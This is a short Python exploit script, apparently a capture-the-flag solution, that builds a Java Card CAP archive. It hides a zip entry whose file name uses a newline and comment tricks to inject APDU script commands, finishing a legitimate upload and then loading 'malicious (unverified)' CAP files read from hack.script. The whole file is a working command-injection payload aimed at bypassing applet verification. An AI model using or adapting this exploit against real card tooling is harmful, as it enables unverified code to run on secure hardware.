import shutil
import zipfile

shutil.copy("library.cap", "upload/exploit.cap")
commands = [
    # finish uploading the original cap file
    # ConstantPool.cap
    "0x80 0xB2 0x05 0x00 0x00 0x7F;",
    "0x80 0xB4 0x05 0x00 0x05 0x05 0x00 0x02 0x00 0x00 0x7F;",
    "0x80 0xBC 0x05 0x00 0x00 0x7F;",
    # RefLocation.cap
    "0x80 0xB2 0x09 0x00 0x00 0x7F;",
    "0x80 0xB4 0x09 0x00 0x07 0x09 0x00 0x04 0x00 0x00 0x00 0x00 0x7F;",
    "0x80 0xBC 0x09 0x00 0x00 0x7F;",
    # finalize upload of original cap file
    "0x80 0xBA 0x00 0x00 0x00 0x7F;",
]
# add malicious (unverified) cap file(s) and any additional commands
commands += [row.strip() for row in open("hack.script") if row.strip() and not row.startswith("//")]

# convert commands to a file path
filename = "com/[*]\noutput on;"
for command in commands:
    command = " ".join(str(int(c, 0)) for c in command.rstrip(";").split())
    filename += "/* */" + command + ";"
filename += "/export.cap"

zf = zipfile.ZipFile("upload/exploit.cap", "a")
zf.writestr(filename, b"dummy")